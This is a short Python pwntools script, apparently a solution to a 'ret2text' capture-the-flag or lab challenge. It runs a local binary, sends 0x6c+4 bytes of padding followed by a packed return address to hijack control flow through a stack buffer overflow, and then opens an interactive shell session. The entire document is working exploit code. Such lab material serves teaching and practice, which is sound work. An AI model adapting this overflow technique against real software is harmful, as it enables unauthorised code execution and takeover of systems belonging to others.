from pwn import *
target = 0x0804863A
offset=0x6c+4
sh=process("./ret2text")
sh.sendline(b'M'*offset+p32(target))
sh.interactive()
